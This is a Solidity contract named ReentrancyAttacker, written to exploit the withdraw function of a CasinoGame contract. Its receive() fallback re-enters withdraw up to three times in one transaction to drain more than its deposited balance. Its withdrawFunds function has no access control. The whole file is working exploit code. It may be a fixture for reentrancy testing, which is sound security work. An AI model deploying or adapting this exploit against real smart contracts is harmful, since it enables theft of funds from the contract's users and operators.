// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICasinoGame {
    function placeBet() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address player) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev A contract that attempts to exploit reentrancy vulnerabilities in the CasinoGame contract
 */
contract ReentrancyAttacker {
    ICasinoGame public casinoGame;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 3;

    constructor(address _casinoGameAddress) {
        casinoGame = ICasinoGame(_casinoGameAddress);
    }

    // Function to deposit funds to the casino
    function deposit() external payable {
        casinoGame.placeBet{value: msg.value}();
    }

    // Function to initiate the attack
    function attack() external {
        // Reset attack counter
        attackCount = 0;
        
        // Get our balance in the casino
        uint256 balance = casinoGame.balanceOf(address(this));
        require(balance > 0, "No balance to withdraw");
        
        // Start the attack by withdrawing funds
        casinoGame.withdraw(balance);
    }

    // Fallback function that gets called when receiving ETH
    receive() external payable {
        // If we still have attacks to perform and a balance to withdraw
        if (attackCount < MAX_ATTACKS) {
            attackCount++;
            
            // Try to withdraw again in the same transaction
            uint256 balance = casinoGame.balanceOf(address(this));
            if (balance > 0) {
                casinoGame.withdraw(balance);
            }
        }
    }

    // Function to withdraw ETH from this contract
    function withdrawFunds(address payable recipient, uint256 amount) external {
        require(recipient != address(0), "Invalid recipient");
        require(amount <= address(this).balance, "Insufficient balance");
        
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }
} 